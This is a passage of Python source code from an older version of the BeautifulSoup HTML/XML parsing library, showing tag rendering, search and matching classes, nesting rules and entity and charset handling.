of this tag and\n        its contents. To get Unicode, pass None for encoding.\n\n        NOTE: since Python's HTML parser consumes whitespace, this\n        method is not certain to reproduce the whitespace present in\n        the original string.\"\"\"\n\n        encodedName = self.toEncoding(self.name, encoding)\n\n        attrs = []\n        if self.attrs:\n            for key, val in self.attrs:\n                fmt = '%s=\"%s\"'\n                if isinstance(val, basestring):\n                    if self.containsSubstitutions and '%SOUP-ENCODING%' in val:\n                        val = self.substituteEncoding(val, encoding)\n\n                    # The attribute value either:\n                    #\n                    # * Contains no embedded double quotes or single quotes.\n                    #   No problem: we enclose it in double quotes.\n                    # * Contains embedded single quotes. No problem:\n                    #   double quotes work here too.\n                    # * Contains embedded double quotes. No problem:\n                    #   we enclose it in single quotes.\n                    # * Embeds both single _and_ double quotes. This\n                    #   can't happen naturally, but it can happen if\n                    #   you modify an attribute value after parsing\n                    #   the document. Now we have a bit of a\n                    #   problem. We solve it by enclosing the\n                    #   attribute in single quotes, and escaping any\n                    #   embedded single quotes to XML entities.\n                    if '\"' in val:\n                        fmt = \"%s='%s'\"\n                        if \"'\" in val:\n                            # TODO: replace with apos when\n                            # appropriate.\n                            val = val.replace(\"'\", \"&squot;\")\n\n                    # Now we're okay w/r/t quotes. But the attribute\n                    # value might also contain angle brackets, or\n                    # ampersands that aren't part of entities. We need\n                    # to escape those to XML entities too.\n                    val = self.BARE_AMPERSAND_OR_BRACKET.sub(self._sub_entity, val)\n\n                attrs.append(fmt % (self.toEncoding(key, encoding),\n                                    self.toEncoding(val, encoding)))\n        close = ''\n        closeTag = ''\n        if self.isSelfClosing:\n            close = ' /'\n        else:\n            closeTag = '</%s>' % encodedName\n\n        indentTag, indentContents = 0, 0\n        if prettyPrint:\n            indentTag = indentLevel\n            space = (' ' * (indentTag-1))\n            indentContents = indentTag + 1\n        contents = self.renderContents(encoding, prettyPrint, indentContents)\n        if self.hidden:\n            s = contents\n        else:\n            s = []\n            attributeString = ''\n            if attrs:\n                attributeString = ' ' + ' '.join(attrs)\n            if prettyPrint:\n                s.append(space)\n            s.append('<%s%s%s>' % (encodedName, attributeString, close))\n            if prettyPrint:\n                s.append(\"\\n\")\n            s.append(contents)\n            if prettyPrint and contents and contents[-1] != \"\\n\":\n                s.append(\"\\n\")\n            if prettyPrint and closeTag:\n                s.append(space)\n            s.append(closeTag)\n            if prettyPrint and closeTag and self.nextSibling:\n                s.append(\"\\n\")\n            s = ''.join(s)\n        return s\n\n    def decompose(self):\n        \"\"\"Recursively destroys the contents of this tree.\"\"\"\n        self.extract()\n        if len(self.contents) == 0:\n            return\n        current = self.contents[0]\n        while current is not None:\n            next = current.next\n            if isinstance(current, Tag):\n                del current.contents[:]\n            current.parent = None\n            current.previous = None\n            current.previousSibling = None\n            current.next = None\n            current.nextSibling = None\n            current = next\n\n    def prettify(self, encoding=DEFAULT_OUTPUT_ENCODING):\n        return self.__str__(encoding, True)\n\n    def renderContents(self, encoding=DEFAULT_OUTPUT_ENCODING,\n                       prettyPrint=False, indentLevel=0):\n        \"\"\"Renders the contents of this tag as a string in the given\n        encoding. If encoding is None, returns a Unicode string..\"\"\"\n        s=[]\n        for c in self:\n            text = None\n            if isinstance(c, NavigableString):\n                text = c.__str__(encoding)\n            elif isinstance(c, Tag):\n                s.append(c.__str__(encoding, prettyPrint, indentLevel))\n            if text and prettyPrint:\n                text = text.strip()\n            if text:\n                if prettyPrint:\n                    s.append(\" \" * (indentLevel-1))\n                s.append(text)\n                if prettyPrint:\n                    s.append(\"\\n\")\n\n        return ''.join(s)\n\n    #Soup methods\n\n    def find(self, name=None, attrs={}, recursive=True, text=None,\n             **kwargs):\n        \"\"\"Return only the first child of this Tag matching the given\n        criteria.\"\"\"\n        r = None\n        l = self.findAll(name, attrs, recursive, text, 1, **kwargs)\n        if l:\n            r = l[0]\n        return r\n    findChild = find\n\n    def findAll(self, name=None, attrs={}, recursive=True, text=None,\n                limit=None, **kwargs):\n        \"\"\"Extracts a list of Tag objects that match the given\n        criteria.  You can specify the name of the Tag and any\n        attributes you want the Tag to have.\n\n        The value of a key-value pair in the 'attrs' map can be a\n        string, a list of strings, a regular expression object, or a\n        callable that takes a string and returns whether or not the\n        string matches for some custom definition of 'matches'. The\n        same is true of the tag name.\"\"\"\n        generator = self.recursiveChildGenerator\n        if not recursive:\n            generator = self.childGenerator\n        return self._findAll(name, attrs, text, limit, generator, **kwargs)\n    findChildren = findAll\n\n    # Pre-3.x compatibility methods\n    first = find\n    fetch = findAll\n\n    def fetchText(self, text=None, recursive=True, limit=None):\n        return self.findAll(text=text, recursive=recursive, limit=limit)\n\n    def firstText(self, text=None, recursive=True):\n        return self.find(text=text, recursive=recursive)\n\n    #Private methods\n\n    def _getAttrMap(self):\n        \"\"\"Initializes a map representation of this tag's attributes,\n        if not already initialized.\"\"\"\n        if not getattr(self, 'attrMap'):\n            self.attrMap = {}\n            for (key, value) in self.attrs:\n                self.attrMap[key] = value\n        return self.attrMap\n\n    #Generator methods\n    def childGenerator(self):\n        # Just use the iterator from the contents\n        return iter(self.contents)\n\n    def recursiveChildGenerator(self):\n        if not len(self.contents):\n            return  # Note: https://stackoverflow.com/a/30217723 (PEP 479)\n        stopNode = self._lastRecursiveChild().next\n        current = self.contents[0]\n        while current and current is not stopNode:\n            yield current\n            current = current.next\n\n\n# Next, a couple classes to represent queries and their results.\nclass SoupStrainer:\n    \"\"\"Encapsulates a number of ways of matching a markup element (tag or\n    text).\"\"\"\n\n    def __init__(self, name=None, attrs={}, text=None, **kwargs):\n        self.name = name\n        if isinstance(attrs, basestring):\n            kwargs['class'] = _match_css_class(attrs)\n            attrs = None\n        if kwargs:\n            if attrs:\n                attrs = attrs.copy()\n                attrs.update(kwargs)\n            else:\n                attrs = kwargs\n        self.attrs = attrs\n        self.text = text\n\n    def __str__(self):\n        if self.text:\n            return self.text\n        else:\n            return \"%s|%s\" % (self.name, self.attrs)\n\n    def searchTag(self, markupName=None, markupAttrs={}):\n        found = None\n        markup = None\n        if isinstance(markupName, Tag):\n            markup = markupName\n            markupAttrs = markup\n        callFunctionWithTagData = callable(self.name) \\\n                                and not isinstance(markupName, Tag)\n\n        if (not self.name) \\\n               or callFunctionWithTagData \\\n               or (markup and self._matches(markup, self.name)) \\\n               or (not markup and self._matches(markupName, self.name)):\n            if callFunctionWithTagData:\n                match = self.name(markupName, markupAttrs)\n            else:\n                match = True\n                markupAttrMap = None\n                for attr, matchAgainst in self.attrs.items():\n                    if not markupAttrMap:\n                         if hasattr(markupAttrs, 'get'):\n                            markupAttrMap = markupAttrs\n                         else:\n                            markupAttrMap = {}\n                            for k,v in markupAttrs:\n                                markupAttrMap[k] = v\n                    attrValue = markupAttrMap.get(attr)\n                    if not self._matches(attrValue, matchAgainst):\n                        match = False\n                        break\n            if match:\n                if markup:\n                    found = markup\n                else:\n                    found = markupName\n        return found\n\n    def search(self, markup):\n        #print 'looking for %s in %s' % (self, markup)\n        found = None\n        # If given a list of items, scan it for a text element that\n        # matches.\n        if hasattr(markup, \"__iter__\") \\\n                and not isinstance(markup, Tag):\n            for element in markup:\n                if isinstance(element, NavigableString) \\\n                       and self.search(element):\n                    found = element\n                    break\n        # If it's a Tag, make sure its name or attributes match.\n        # Don't bother with Tags if we're searching for text.\n        elif isinstance(markup, Tag):\n            if not self.text:\n                found = self.searchTag(markup)\n        # If it's text, make sure the text matches.\n        elif isinstance(markup, NavigableString) or \\\n                 isinstance(markup, basestring):\n            if self._matches(markup, self.text):\n                found = markup\n        else:\n            raise Exception(\"I don't know how to match against a %s\" \\\n                  % markup.__class__)\n        return found\n\n    def _matches(self, markup, matchAgainst):\n        #print \"Matching %s against %s\" % (markup, matchAgainst)\n        result = False\n        if matchAgainst is True:\n            result = markup is not None\n        elif callable(matchAgainst):\n            result = matchAgainst(markup)\n        else:\n            #Custom match methods take the tag as an argument, but all\n            #other ways of matching match the tag name as a string.\n            if isinstance(markup, Tag):\n                markup = markup.name\n            if markup and not isinstance(markup, basestring):\n                markup = text_type(markup)\n            #Now we know that chunk is either a string, or None.\n            if hasattr(matchAgainst, 'match'):\n                # It's a regexp object.\n                result = markup and matchAgainst.search(markup)\n            elif hasattr(matchAgainst, '__iter__'): # list-like\n                result = markup in matchAgainst\n            elif hasattr(matchAgainst, 'items'):\n                result = markup.has_key(matchAgainst)\n            elif matchAgainst and isinstance(markup, basestring):\n                if isinstance(markup, text_type):\n                    matchAgainst = text_type(matchAgainst)\n                else:\n                    matchAgainst = str(matchAgainst)\n\n            if not result:\n                result = matchAgainst == markup\n        return result\n\nclass ResultSet(list):\n    \"\"\"A ResultSet is just a list that keeps track of the SoupStrainer\n    that created it.\"\"\"\n    def __init__(self, source):\n        list.__init__([])\n        self.source = source\n\n# Now, some helper functions.\n\ndef buildTagMap(default, *args):\n    \"\"\"Turns a list of maps, lists, or scalars into a single map.\n    Used to build the SELF_CLOSING_TAGS, NESTABLE_TAGS, and\n    NESTING_RESET_TAGS maps out of lists and partial maps.\"\"\"\n    built = {}\n    for portion in args:\n        if hasattr(portion, 'items'):\n            #It's a map. Merge it.\n            for k,v in portion.items():\n                built[k] = v\n        elif hasattr(portion, '__iter__'): # is a list\n            #It's a list. Map each item to the default.\n            for k in portion:\n                built[k] = default\n        else:\n            #It's a scalar. Map it to the default.\n            built[portion] = default\n    return built\n\n# Now, the parser classes.\n\nclass BeautifulStoneSoup(Tag, sgmllib.SGMLParser):\n\n    \"\"\"This class contains the basic parser and search code. It defines\n    a parser that knows nothing about tag behavior except for the\n    following:\n\n      You can't close a tag without closing all the tags it encloses.\n      That is, \"<foo><bar></foo>\" actually means\n      \"<foo><bar></bar></foo>\".\n\n    [Another possible explanation is \"<foo><bar /></foo>\", but since\n    this class defines no SELF_CLOSING_TAGS, it will never use that\n    explanation.]\n\n    This class is useful for parsing XML or made-up markup languages,\n    or when BeautifulSoup makes an assumption counter to what you were\n    expecting.\"\"\"\n\n    SELF_CLOSING_TAGS = {}\n    NESTABLE_TAGS = {}\n    RESET_NESTING_TAGS = {}\n    QUOTE_TAGS = {}\n    PRESERVE_WHITESPACE_TAGS = []\n\n    MARKUP_MASSAGE = [(re.compile(r'(<[^<>]*)/>'),\n                       lambda x: x.group(1) + ' />'),\n                      (re.compile(r'<!\\s+([^<>]*)>'),\n                       lambda x: '<!' + x.group(1) + '>')\n                      ]\n\n    ROOT_TAG_NAME = u'[document]'\n\n    HTML_ENTITIES = \"html\"\n    XML_ENTITIES = \"xml\"\n    XHTML_ENTITIES = \"xhtml\"\n    # TODO: This only exists for backwards-compatibility\n    ALL_ENTITIES = XHTML_ENTITIES\n\n    # Used when determining whether a text node is all whitespace and\n    # can be replaced with a single space. A text node that contains\n    # fancy Unicode spaces (usually non-breaking) should be left\n    # alone.\n    STRIP_ASCII_SPACES = { 9: None, 10: None, 12: None, 13: None, 32: None, }\n\n    def __init__(self, markup=\"\", parseOnlyThese=None, fromEncoding=None,\n                 markupMassage=True, smartQuotesTo=XML_ENTITIES,\n                 convertEntities=None, selfClosingTags=None, isHTML=False):\n        \"\"\"The Soup object is initialized as the 'root tag', and the\n        provided markup (which can be a string or a file-like object)\n        is fed into the underlying parser.\n\n        sgmllib will process most bad HTML, and the BeautifulSoup\n        class has some tricks for dealing with some HTML that kills\n        sgmllib, but Beautiful Soup can nonetheless choke or lose data\n        if your data uses self-closing tags or declarations\n        incorrectly.\n\n        By default, Beautiful Soup uses regexes to sanitize input,\n        avoiding the vast majority of these problems. If the problems\n        don't apply to you, pass in False for markupMassage, and\n        you'll get better performance.\n\n        The default parser massage techniques fix the two most common\n        instances of invalid HTML that choke sgmllib:\n\n         <br/> (No space between name of closing tag and tag close)\n         <! --Comment--> (Extraneous whitespace in declaration)\n\n        You can pass in a custom list of (RE object, replace method)\n        tuples to get Beautiful Soup to scrub your input the way you\n        want.\"\"\"\n\n        self.parseOnlyThese = parseOnlyThese\n        self.fromEncoding = fromEncoding\n        self.smartQuotesTo = smartQuotesTo\n        self.convertEntities = convertEntities\n        # Set the rules for how we'll deal with the entities we\n        # encounter\n        if self.convertEntities:\n            # It doesn't make sense to convert encoded characters to\n            # entities even while you're converting entities to Unicode.\n            # Just convert it all to Unicode.\n            self.smartQuotesTo = None\n            if convertEntities == self.HTML_ENTITIES:\n                self.convertXMLEntities = False\n                self.convertHTMLEntities = True\n                self.escapeUnrecognizedEntities = True\n            elif convertEntities == self.XHTML_ENTITIES:\n                self.convertXMLEntities = True\n                self.convertHTMLEntities = True\n                self.escapeUnrecognizedEntities = False\n            elif convertEntities == self.XML_ENTITIES:\n                self.convertXMLEntities = True\n                self.convertHTMLEntities = False\n                self.escapeUnrecognizedEntities = False\n        else:\n            self.convertXMLEntities = False\n            self.convertHTMLEntities = False\n            self.escapeUnrecognizedEntities = False\n\n        self.instanceSelfClosingTags = buildTagMap(None, selfClosingTags)\n        sgmllib.SGMLParser.__init__(self)\n\n        if hasattr(markup, 'read'):        # It's a file-type object.\n            markup = markup.read()\n        self.markup = markup\n        self.markupMassage = markupMassage\n        try:\n            self._feed(isHTML=isHTML)\n        except StopParsing:\n            pass\n        self.markup = None                 # The markup can now be GCed\n\n    def convert_charref(self, name):\n        \"\"\"This method fixes a bug in Python's SGMLParser.\"\"\"\n        try:\n            n = int(name)\n        except ValueError:\n            return\n        if not 0 <= n <= 127 : # ASCII ends at 127, not 255\n            return\n        return self.convert_codepoint(n)\n\n    def _feed(self, inDocumentEncoding=None, isHTML=False):\n        # Convert the document to Unicode.\n        markup = self.markup\n        if isinstance(markup, text_type):\n            if not hasattr(self, 'originalEncoding'):\n                self.originalEncoding = None\n        else:\n            dammit = UnicodeDammit\\\n                     (markup, [self.fromEncoding, inDocumentEncoding],\n                      smartQuotesTo=self.smartQuotesTo, isHTML=isHTML)\n            markup = dammit.unicode\n            self.originalEncoding = dammit.originalEncoding\n            self.declaredHTMLEncoding = dammit.declaredHTMLEncoding\n        if markup:\n            if self.markupMassage:\n                if not hasattr(self.markupMassage, \"__iter__\"):\n                    self.markupMassage = self.MARKUP_MASSAGE\n                for fix, m in self.markupMassage:\n                    markup = fix.sub(m, markup)\n                # TODO: We get rid of markupMassage so that the\n                # soup object can be deepcopied later on. Some\n                # Python installations can't copy regexes. If anyone\n                # was relying on the existence of markupMassage, this\n                # might cause problems.\n                del(self.markupMassage)\n        self.reset()\n\n        sgmllib.SGMLParser.feed(self, markup)\n        # Close out any unfinished strings and close all the open tags.\n        self.endData()\n        while self.currentTag.name != self.ROOT_TAG_NAME:\n            self.popTag()\n\n    def __getattr__(self, methodName):\n        \"\"\"This method routes method call requests to either the SGMLParser\n        superclass or the Tag superclass, depending on the method name.\"\"\"\n        #print \"__getattr__ called on %s.%s\" % (self.__class__, methodName)\n\n        if methodName.startswith('start_') or methodName.startswith('end_') \\\n               or methodName.startswith('do_'):\n            return sgmllib.SGMLParser.__getattr__(self, methodName)\n        elif not methodName.startswith('__'):\n            return Tag.__getattr__(self, methodName)\n        else:\n            raise AttributeError\n\n    def isSelfClosingTag(self, name):\n        \"\"\"Returns true iff the given string is the name of a\n        self-closing tag according to this parser.\"\"\"\n        return name in self.SELF_CLOSING_TAGS \\\n               or name in self.instanceSelfClosingTags\n\n    def reset(self):\n        Tag.__init__(self, self, self.ROOT_TAG_NAME)\n        self.hidden = 1\n        sgmllib.SGMLParser.reset(self)\n        self.currentData = []\n        self.currentTag = None\n        self.tagStack = []\n        self.quoteStack = []\n        self.pushTag(self)\n\n    def popTag(self):\n        tag = self.tagStack.pop()\n\n        #print \"Pop\", tag.name\n        if self.tagStack:\n            self.currentTag = self.tagStack[-1]\n        return self.currentTag\n\n    def pushTag(self, tag):\n        #print \"Push\", tag.name\n        if self.currentTag:\n            self.currentTag.contents.append(tag)\n        self.tagStack.append(tag)\n        self.currentTag = self.tagStack[-1]\n\n    def endData(self, containerClass=NavigableString):\n        if self.currentData:\n            currentData = u''.join(self.currentData)\n            if (currentData.translate(self.STRIP_ASCII_SPACES) == '' and\n                not set([tag.name for tag in self.tagStack]).intersection(\n                    self.PRESERVE_WHITESPACE_TAGS)):\n                if '\\n' in currentData:\n                    currentData = '\\n'\n                else:\n                    currentData = ' '\n            self.currentData = []\n            if self.parseOnlyThese and len(self.tagStack) <= 1 and \\\n                   (not self.parseOnlyThese.text or \\\n                    not self.parseOnlyThese.search(currentData)):\n                return\n            o = containerClass(currentData)\n            o.setup(self.currentTag, self.previous)\n            if self.previous:\n                self.previous.next = o\n            self.previous = o\n            self.currentTag.contents.append(o)\n\n\n    def _popToTag(self, name, inclusivePop=True):\n        \"\"\"Pops the tag stack up to and including the most recent\n        instance of the given tag. If inclusivePop is false, pops the tag\n        stack up to but *not* including the most recent instqance of\n        the given tag.\"\"\"\n        #print \"Popping to %s\" % name\n        if name == self.ROOT_TAG_NAME:\n            return\n\n        numPops = 0\n        mostRecentTag = None\n        for i in xrange(len(self.tagStack)-1, 0, -1):\n            if name == self.tagStack[i].name:\n                numPops = len(self.tagStack)-i\n                break\n        if not inclusivePop:\n            numPops = numPops - 1\n\n        for i in xrange(0, numPops):\n            mostRecentTag = self.popTag()\n        return mostRecentTag\n\n    def _smartPop(self, name):\n\n        \"\"\"We need to pop up to the previous tag of this type, unless\n        one of this tag's nesting reset triggers comes between this\n        tag and the previous tag of this type, OR unless this tag is a\n        generic nesting trigger and another generic nesting trigger\n        comes between this tag and the previous tag of this type.\n\n        Examples:\n         <p>Foo<b>Bar *<p>* should pop to 'p', not 'b'.\n         <p>Foo<table>Bar *<p>* should pop to 'table', not 'p'.\n         <p>Foo<table><tr>Bar *<p>* should pop to 'tr', not 'p'.\n\n         <li><ul><li> *<li>* should pop to 'ul', not the first 'li'.\n         <tr><table><tr> *<tr>* should pop to 'table', not the first 'tr'\n         <td><tr><td> *<td>* should pop to 'tr', not the first 'td'\n        \"\"\"\n\n        nestingResetTriggers = self.NESTABLE_TAGS.get(name)\n        isNestable = nestingResetTriggers != None\n        isResetNesting = name in self.RESET_NESTING_TAGS\n        popTo = None\n        inclusive = True\n        for i in xrange(len(self.tagStack)-1, 0, -1):\n            p = self.tagStack[i]\n            if (not p or p.name == name) and not isNestable:\n                #Non-nestable tags get popped to the top or to their\n                #last occurance.\n                popTo = name\n                break\n            if (nestingResetTriggers is not None\n                and p.name in nestingResetTriggers) \\\n                or (nestingResetTriggers is None and isResetNesting\n                    and p.name in self.RESET_NESTING_TAGS):\n\n                #If we encounter one of the nesting reset triggers\n                #peculiar to this tag, or we encounter another tag\n                #that causes nesting to reset, pop up to but not\n                #including that tag.\n                popTo = p.name\n                inclusive = False\n                break\n            p = p.parent\n        if popTo:\n            self._popToTag(popTo, inclusive)\n\n    def unknown_starttag(self, name, attrs, selfClosing=0):\n        #print \"Start tag %s: %s\" % (name, attrs)\n        if self.quoteStack:\n            #This is not a real tag.\n            #print \"<%s> is not real!\" % name\n            attrs = ''.join([' %s=\"%s\"' % (x, y) for x, y in attrs])\n            self.handle_data('<%s%s>' % (name, attrs))\n            return\n        self.endData()\n\n        if not self.isSelfClosingTag(name) and not selfClosing:\n            self._smartPop(name)\n\n        if self.parseOnlyThese and len(self.tagStack) <= 1 \\\n               and (self.parseOnlyThese.text or not self.parseOnlyThese.searchTag(name, attrs)):\n            return\n\n        tag = Tag(self, name, attrs, self.currentTag, self.previous)\n        if self.previous:\n            self.previous.next = tag\n        self.previous = tag\n        self.pushTag(tag)\n        if selfClosing or self.isSelfClosingTag(name):\n            self.popTag()\n        if name in self.QUOTE_TAGS:\n            #print \"Beginning quote (%s)\" % name\n            self.quoteStack.append(name)\n            self.literal = 1\n        return tag\n\n    def unknown_endtag(self, name):\n        #print \"End tag %s\" % name\n        if self.quoteStack and self.quoteStack[-1] != name:\n            #This is not a real end tag.\n            #print \"</%s> is not real!\" % name\n            self.handle_data('</%s>' % name)\n            return\n        self.endData()\n        self._popToTag(name)\n        if self.quoteStack and self.quoteStack[-1] == name:\n            self.quoteStack.pop()\n            self.literal = (len(self.quoteStack) > 0)\n\n    def handle_data(self, data):\n        self.currentData.append(data)\n\n    def _toStringSubclass(self, text, subclass):\n        \"\"\"Adds a certain piece of text to the tree as a NavigableString\n        subclass.\"\"\"\n        self.endData()\n        self.handle_data(text)\n        self.endData(subclass)\n\n    def handle_pi(self, text):\n        \"\"\"Handle a processing instruction as a ProcessingInstruction\n        object, possibly one with a %SOUP-ENCODING% slot into which an\n        encoding will be plugged later.\"\"\"\n        if text[:3] == \"xml\":\n            text = u\"xml version='1.0' encoding='%SOUP-ENCODING%'\"\n        self._toStringSubclass(text, ProcessingInstruction)\n\n    def handle_comment(self, text):\n        \"Handle comments as Comment objects.\"\n        self._toStringSubclass(text, Comment)\n\n    def handle_charref(self, ref):\n        \"Handle character references as data.\"\n        if self.convertEntities:\n            data = unichr(int(ref))\n        else:\n            data = '&#%s;' % ref\n        self.handle_data(data)\n\n    def handle_entityref(self, ref):\n        \"\"\"Handle entity references as data, possibly converting known\n        HTML and/or XML entity references to the corresponding Unicode\n        characters.\"\"\"\n        data = None\n        if self.convertHTMLEntities:\n            try:\n                data = unichr(name2codepoint[ref])\n            except KeyError:\n                pass\n\n        if not data and self.convertXMLEntities:\n                data = self.XML_ENTITIES_TO_SPECIAL_CHARS.get(ref)\n\n        if not data and self.convertHTMLEntities and \\\n            not self.XML_ENTITIES_TO_SPECIAL_CHARS.get(ref):\n                # TODO: We've got a problem here. We're told this is\n                # an entity reference, but it's not an XML entity\n                # reference or an HTML entity reference. Nonetheless,\n                # the logical thing to do is to pass it through as an\n                # unrecognized entity reference.\n                #\n                # Except: when the input is \"&carol;\" this function\n                # will be called with input \"carol\". When the input is\n                # \"AT&T\", this function will be called with input\n                # \"T\". We have no way of knowing whether a semicolon\n                # was present originally, so we don't know whether\n                # this is an unknown entity or just a misplaced\n                # ampersand.\n                #\n                # The more common case is a misplaced ampersand, so I\n                # escape the ampersand and omit the trailing semicolon.\n                data = \"&amp;%s\" % ref\n        if not data:\n            # This case is different from the one above, because we\n            # haven't already gone through a supposedly comprehensive\n            # mapping of entities to Unicode characters. We might not\n            # have gone through any mapping at all. So the chances are\n            # very high that this is a real entity, and not a\n            # misplaced ampersand.\n            data = \"&%s;\" % ref\n        self.handle_data(data)\n\n    def handle_decl(self, data):\n        \"Handle DOCTYPEs and the like as Declaration objects.\"\n        self._toStringSubclass(data, Declaration)\n\n    def parse_declaration(self, i):\n        \"\"\"Treat a bogus SGML declaration as raw data. Treat a CDATA\n        declaration as a CData object.\"\"\"\n        j = None\n        if self.rawdata[i:i+9] == '<![CDATA[':\n             k = self.rawdata.find(']]>', i)\n             if k == -1:\n                 k = len(self.rawdata)\n             data = self.rawdata[i+9:k]\n             j = k+3\n             self._toStringSubclass(data, CData)\n        else:\n            try:\n                j = sgmllib.SGMLParser.parse_declaration(self, i)\n            except sgmllib.SGMLParseError:\n                toHandle = self.rawdata[i:]\n                self.handle_data(toHandle)\n                j = i + len(toHandle)\n        return j\n\nclass BeautifulSoup(BeautifulStoneSoup):\n\n    \"\"\"This parser knows the following facts about HTML:\n\n    * Some tags have no closing tag and should be interpreted as being\n      closed as soon as they are encountered.\n\n    * The text inside some tags (ie. 'script') may contain tags which\n      are not really part of the document and which should be parsed\n      as text, not tags. If you want to parse the text as tags, you can\n      always fetch it and parse it explicitly.\n\n    * Tag nesting rules:\n\n      Most tags can't be nested at all. For instance, the occurance of\n      a <p> tag should implicitly close the previous <p> tag.\n\n       <p>Para1<p>Para2\n        should be transformed into:\n       <p>Para1</p><p>Para2\n\n      Some tags can be nested arbitrarily. For instance, the occurance\n      of a <blockquote> tag should _not_ implicitly close the previous\n      <blockquote> tag.\n\n       Alice said: <blockquote>Bob said: <blockquote>Blah\n        should NOT be transformed into:\n       Alice said: <blockquote>Bob said: </blockquote><blockquote>Blah\n\n      Some tags can be nested, but the nesting is reset by the\n      interposition of other tags. For instance, a <tr> tag should\n      implicitly close the previous <tr> tag within the same <table>,\n      but not close a <tr> tag in another table.\n\n       <table><tr>Blah<tr>Blah\n        should be transformed into:\n       <table><tr>Blah</tr><tr>Blah\n        but,\n       <tr>Blah<table><tr>Blah\n        should NOT be transformed into\n       <tr>Blah<table></tr><tr>Blah\n\n    Differing assumptions about tag nesting rules are a major source\n    of problems with the BeautifulSoup class. If BeautifulSoup is not\n    treating as nestable a tag your page author treats as nestable,\n    try ICantBelieveItsBeautifulSoup, MinimalSoup, or\n    BeautifulStoneSoup before writing your own subclass.\"\"\"\n\n    def __init__(self, *args, **kwargs):\n        if 'smartQuotesTo' not in kwargs:\n            kwargs['smartQuotesTo'] = self.HTML_ENTITIES\n        kwargs['isHTML'] = True\n        BeautifulStoneSoup.__init__(self, *args, **kwargs)\n\n    SELF_CLOSING_TAGS = buildTagMap(None,\n                                    ('br' , 'hr', 'input', 'img', 'meta',\n                                    'spacer', 'link', 'frame', 'base', 'col'))\n\n    PRESERVE_WHITESPACE_TAGS = set(['pre', 'textarea'])\n\n    QUOTE_TAGS = {'script' : None, 'textarea' : None}\n\n    #According to the HTML standard, each of these inline tags can\n    #contain another tag of the same type. Furthermore, it's common\n    #to actually use these tags this way.\n    NESTABLE_INLINE_TAGS = ('span', 'font', 'q', 'object', 'bdo', 'sub', 'sup',\n                            'center')\n\n    #According to the HTML standard, these block tags can contain\n    #another tag of the same type. Furthermore, it's common\n    #to actually use these tags this way.\n    NESTABLE_BLOCK_TAGS = ('blockquote', 'div', 'fieldset', 'ins', 'del')\n\n    #Lists can contain other lists, but there are restrictions.\n    NESTABLE_LIST_TAGS = { 'ol' : [],\n                           'ul' : [],\n                           'li' : ['ul', 'ol'],\n                           'dl' : [],\n                           'dd' : ['dl'],\n                           'dt' : ['dl'] }\n\n    #Tables can contain other tables, but there are restrictions.\n    NESTABLE_TABLE_TAGS = {'table' : [],\n                           'tr' : ['table', 'tbody', 'tfoot', 'thead'],\n                           'td' : ['tr'],\n                           'th' : ['tr'],\n                           'thead' : ['table'],\n                           'tbody' : ['table'],\n                           'tfoot' : ['table'],\n                           }\n\n    NON_NESTABLE_BLOCK_TAGS = ('address', 'form', 'p', 'pre')\n\n    #If one of these tags is encountered, all tags up to the next tag of\n    #this type are popped.\n    RESET_NESTING_TAGS = buildTagMap(None, NESTABLE_BLOCK_TAGS, 'noscript',\n                                     NON_NESTABLE_BLOCK_TAGS,\n                                     NESTABLE_LIST_TAGS,\n                                     NESTABLE_TABLE_TAGS)\n\n    NESTABLE_TAGS = buildTagMap([], NESTABLE_INLINE_TAGS, NESTABLE_BLOCK_TAGS,\n                                NESTABLE_LIST_TAGS, NESTABLE_TABLE_TAGS)\n\n    # Used to detect the charset in a META tag; see start_meta\n    CHARSET_RE = re.compile(r\"((^|;)\\s*charset=)([^;]*)\", re.M)\n\n    def start_meta(self, attrs):\n        \"\"\"Beautiful Soup can detect a charset included in a META tag,\n        try to convert the document to that charset, and re-parse the\n        document from the beginning.\"\"\"\n        httpEquiv = None\n        contentType = None\n        contentTypeIndex = None\n        tagNeedsEncodingSubstitution = False\n\n        for i in xrange(0, len(attrs)):\n            key, value = attrs[i]\n            key = key.lower()\n            if key == 'http-equiv':\n                httpEquiv = value\n            elif key == 'content':\n                contentType = value\n                contentTypeIndex = i\n\n        if httpEquiv and contentType: # It's an interesting meta tag.\n            match = self.CHARSET_RE.search(contentType)\n            if match:\n                if (self.declaredHTMLEncoding is not None or\n                    self.originalEncoding == self.fromEncoding):\n                    # An HTML encoding was sniffed while converting\n                    # the document to Unicode, or an HTML encoding was\n                    # sniffed during a previous pass through the\n                    # document, or an encoding was specified\n                    # explicitly and it worked. Rewrite the meta tag.\n                    def rewrite(match):\n                        return match.group(1) + \"%SOUP-ENCODING%\"\n                    newAttr = self.CHARSET_RE.sub(rewrite, contentType)\n                    attrs[contentTypeIndex] = (attrs[contentTypeIndex][0],\n                                               newAttr)\n                    tagNeedsEncodingSubstitution = True\n                else:\n                    # This is our first pass through the document.\n                    # Go through it again with the encoding information.\n                    newCharset = match.group(3)\n                    if newCharset and newCharset != self.originalEncoding:\n                        self.declaredHTMLEncoding = newCharset\n                        self._feed(self.declaredHTMLEncoding)\n                        raise StopParsing\n                    pass\n        tag = self.unknown_starttag(\"meta\", attrs)\n        if tag and tagNeedsEncodingSubstitution:\n            tag.containsSubstitutions = True\n\nclass StopParsing(Exception):\n    pass\n\nclass ICantBelieveItsBeautifulSoup(BeautifulSoup):\n\n    \"\"\"The BeautifulSoup class is oriented towards skipping over\n    common HTML errors like unclosed tags. However, sometimes it makes\n    errors of its own. For instance, consider this fragment:\n\n     <b>Foo<b>Bar</b></b>\n\n    This is perfectly valid (if bizarre) HTML. However, the\n    BeautifulSoup class will implicitly close the first b tag when it\n    encounters the second 'b'. It will think the author wrote\n    \"<b>Foo<b>Bar\", and didn't close the first 'b' tag, because\n    there's no real-world reason to bold something that's already\n    bold. When it encounters '</b></b>' it will close two more 'b'\n    tags, for a grand total of three tags closed instead of two. This\n    can throw off the rest of your document structure. The same is\n    true of a number of other tags, listed below.\n\n    It's much more common for someone to forget to close a 'b' tag\n    than to actually use nested 'b' tags, and the BeautifulSoup class\n    handles the common case. This class handles the not-co-common\n    case: where you can't believe someone wrote what they did, but\n    it's valid HTML and BeautifulSoup screwed up by assuming it\n    wouldn't be.\"\"\"\n\n    I_CANT_BELIEVE_THEYRE_NESTABLE_INLINE_TAGS = \\\n     ('em', 'big', 'i', 'small', 'tt', 'abbr', 'acronym', 'strong',\n      'cite', 'code', 'dfn', 'kbd', 'samp', 'strong', 'var', 'b',\n      'big')\n\n    I_CANT_BELIEVE_THEYRE_NESTABLE_BLOCK_TAGS = ('noscript',)\n\n    NESTABLE_TAGS = buildTagMap([], BeautifulSoup.NESTABLE_TAGS,\n                                